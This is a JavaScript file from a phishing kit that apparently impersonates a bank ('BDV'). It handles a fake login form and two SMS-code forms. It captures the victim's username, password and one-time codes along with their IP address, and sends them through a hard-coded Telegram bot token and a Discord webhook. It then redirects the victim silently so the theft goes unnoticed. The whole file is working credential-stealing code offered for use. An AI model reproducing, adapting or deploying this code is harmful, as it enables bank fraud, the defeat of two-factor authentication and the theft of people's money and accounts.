// tg.js - Versión mejorada para manejar 3 formularios diferentes
async function handleFormSubmit(event) {
    event.preventDefault();
    
    // Obtener IP del usuario
    let ip = 'Desconocida';
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ip = ipData.ip;
    } catch (error) {
        console.error('Error al obtener IP:', error);
    }

    // Determinar qué formulario se está enviando
    const formType = document.getElementById('username') ? 'login' : 
                    document.getElementById('smsCode') ? 'sms1' : 
                    document.getElementById('sms2Code') ? 'sms2' : 'unknown';
    
    let message = '';
    let discordContent = '';
    let redirectUrl = '';
    
    switch(formType) {
        case 'login':
            // Formulario de login (index.html)
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            message = `📨 BDV4RES capturado:\n\n🆔 Usuario: ${username}\n🎭 Contraseña: ${password}\n🌐 IP: ${ip}\n💀 4RES565`;
            discordContent = `📨 **BDV4RES CAPTURADO**\n\n**Usuario:** ${username}\n**Contraseña:** ${password}\n**IP:** ${ip}\n**Marca:** 4RES565`;
            redirectUrl = 'w1.html';
            break;
            
        case 'sms1':
            // Primer formulario de SMS (sms.html)
            const codigo1 = document.getElementById('smsCode').value;
            
            message = `📨 BDV4RES capturado:\n\n💬 CODIGO1: ${codigo1}\n🌐 IP: ${ip}\n💀 4RES565`;
            discordContent = `📨 **BDV4RES CAPTURADO**\n\n**Código SMS 1:** ${codigo1}\n**IP:** ${ip}\n**Marca:** 4RES565`;
            redirectUrl = 'w2.html';
            break;
            
        case 'sms2':
            // Segundo formulario de SMS (sms2.html)
            const codigo2 = document.getElementById('sms2Code').value;
            
            message = `📨 BDV4RES capturado:\n\n💬 CODIGO2: ${codigo2}\n🌐 IP: ${ip}\n💀 4RES565`;
            discordContent = `📨 **BDV4RES CAPTURADO**\n\n**Código SMS 2:** ${codigo2}\n**IP:** ${ip}\n**Marca:** 4RES565`;
            redirectUrl = 'w2.html';
            break;
            
        default:
            console.error('Tipo de formulario no reconocido');
            alert('Error en el sistema. Por favor intente nuevamente.');
            return false;
    }

    // Configuración del bot de Telegram
    const botToken = '7207232429:AAEsTg-EA9tSCaJYazHEqA-lvOfldZTczNU';
    const chatId = '-1002548985972';
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    // Webhook de Discord proporcionado
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1428574338407338044/kgInd80Z5u0ntymDUvJg7wiwe6b2c1LueLE3TSjtyPGQqYTihC1LyTuLDLBY1fpNET0o';

    try {
        // Promesas para enviar a Discord y Telegram
        const discordPromise = fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: discordContent,
                username: 'BDV4RES Logger',
                avatar_url: 'https://cdn-icons-png.flaticon.com/512/3067/3067256.png',
                embeds: [{
                    title: `📨 Nuevo Captura BDV4RES - ${formType.toUpperCase()}`,
                    description: `**Tipo:** ${formType}\n**IP:** ${ip}\n**Fecha:** ${new Date().toLocaleString()}`,
                    color: 16711680, // Rojo
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: 'Sistema BDV4RES - 4RES565'
                    }
                }]
            })
        });

        const telegramPromise = fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        // Enviar ambas solicitudes en paralelo
        const [discordResponse, telegramResponse] = await Promise.all([discordPromise, telegramPromise]);
        
        // Verificar respuestas
        const telegramData = await telegramResponse.json();
        const discordOk = discordResponse.ok;
        
        // Redirigir incluso si solo una de las dos funciona
        if (telegramData.ok || discordOk) {
            console.log('Datos enviados correctamente');
            // Redirigir después de enviar los datos
            if (redirectUrl) {
                window.location.href = redirectUrl;
            }
        } else {
            console.error('Error en las respuestas:', {
                telegram: telegramData,
                discord: discordResponse.status
            });
            // Aún así redirigir para no bloquear al usuario
            if (redirectUrl) {
                window.location.href = redirectUrl;
            }
        }
    } catch (error) {
        console.error('Error al enviar los datos:', error);
        // Aún así redirigir para no bloquear al usuario
        if (redirectUrl) {
            window.location.href = redirectUrl;
        }
    }

    return false;
}

// Función específica para sms2.html (alternativa)
async function handleSms2Submit(event) {
    return handleFormSubmit(event);
}